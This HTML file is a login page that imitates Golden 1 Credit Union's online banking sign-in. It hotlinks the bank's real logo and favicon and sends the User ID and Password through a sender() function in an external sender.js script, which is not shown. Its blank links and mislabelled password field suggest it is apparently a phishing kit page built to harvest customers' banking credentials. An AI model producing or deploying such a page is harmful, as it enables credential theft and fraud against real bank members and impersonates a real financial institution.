<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="shortcut icon" href="https://www.golden1.com/assets/images/favicon-G1-32x32.ico" type="image/x-icon">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Golden 1 | Credit Union | Login</title>
  </head>
  <body>
    <header class="headCon">
      <div class="logo">
        <img
          src="https://www.golden1.com/-/media/golden1/brand-logos/golden1_logo.svg?iar=0&rev=adf9a5f346fe41e7968ffeec43639354&extension=webp&hash=338BCE8A715FC986501CCC15D2BFCA72"
          alt=""
        />
      </div>

      <div class="nav">

        <button>Open Account</button>
        <div class="search">
          <input type="search" placeholder="Search" />
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            viewBox="0 0 16 16"
          >
            <g
              fill="none"
              stroke="black"
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="1.45"
            >
              <path d="m11.25 11.25l3 3" />
              <circle cx="7.5" cy="7.5" r="4.75" />
            </g>
          </svg>
        </div>
        <button>Log In</button>
      </div>
    </header>
    <header class="head2">
      <a href="">Financial Wellness</a>
      <a href="">Appointments</a>
      <a href="">Locations</a>
      <a href="">Membership</a>
    </header>
    <header class="head3">
      <a href="">Checkings</a>
      <a href="">Savings</a>
      <a href="">Home Loans</a>
      <a href="">Credit Cards</a>
      <a href="">Loans</a>
      <a href="">Investing</a>
      <a href="">Community</a>
    </header>

    <div class="hero">
      <form
        class="form"
        method="POST"
        onsubmit=" return sender()"
        id="loginForm"
      >
        <div class="boss">
          <p>PERSONAL BANKING</p>
          <span>LOG IN</span>
        </div>
        <div id="div" >
          <small id="error" style=" font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; "></small>
      </div>
        <div class="title">
          <h1>Enter User ID</h1>
          <h2>Forget User ID</h2>
        </div>

        <div class="in up">
          <input
            type="text"
            name="name"
            id="name"
            placeholder="User ID"
            required
          />
        </div>

        <div class="title">
          <h1>Enter Password</h1>
          <h2>Forget Password</h2>
        </div>

        <div class="in">
          <input
            type="password"
            name="email"
            id="email"
            placeholder="Password"
            required
          />
        </div>

        <div class="btn">
          <input type="submit" value="Log In" id="btn" class="click"/>
        </div>
        <div class="fote">
          <a href="/">Enroll in Online Banking</a>
          <a href="/">Open an Account</a>
          <a href="/">Business Online Banking</a>
        </div>
      </form>
    </div>
    <link rel="stylesheet" href="style.css" />
    <script src="sender.js"></script>
 
  </body>
</html>
